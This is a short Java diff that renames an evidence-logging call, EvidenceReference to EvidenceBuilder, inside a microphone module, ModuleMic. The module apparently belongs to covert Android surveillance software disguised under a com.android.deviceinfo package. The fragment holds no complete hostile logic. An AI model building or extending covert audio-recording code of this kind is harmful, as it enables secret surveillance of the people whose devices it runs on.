@@ -24,7 +24,7 @@ import com.android.deviceinfo.StateRun;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.ConfModule;
-import com.android.deviceinfo.evidence.EvidenceReference;
+import com.android.deviceinfo.evidence.EvidenceBuilder;
 import com.android.deviceinfo.evidence.EvidenceType;
 import com.android.deviceinfo.file.AutoFile;
 import com.android.deviceinfo.interfaces.Observer;
@@ -300,7 +300,7 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 
 
 			if (data.length > 0) {
-				EvidenceReference.atomic(EvidenceType.MIC, getAdditionalData(), data);
+				EvidenceBuilder.atomic(EvidenceType.MIC, getAdditionalData(), data);
 			}
 
 		} else {
